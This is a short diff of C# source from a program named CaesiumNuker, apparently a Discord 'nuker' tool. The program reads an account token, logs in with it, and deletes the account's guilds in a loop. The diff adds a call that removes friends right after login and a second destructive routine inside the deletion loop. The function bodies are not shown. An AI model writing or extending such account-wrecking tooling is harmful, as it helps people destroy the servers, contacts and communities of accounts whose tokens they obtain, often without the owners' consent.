@@ -106,6 +106,7 @@ namespace CaesiumNuker
                 string token = Console.ReadLine();
                 //Login to discord token
                 DiscordClient client = new DiscordClient(token, null);
+                RemoveFriends();
                 void NUKE()
                 {
 
@@ -122,6 +123,7 @@ namespace CaesiumNuker
                             gildiea.Delete();
                             Console.WriteLine("Deleting guilds...");
                             Thread.Sleep(20);
+                            NUKE2();
 
 
                         }
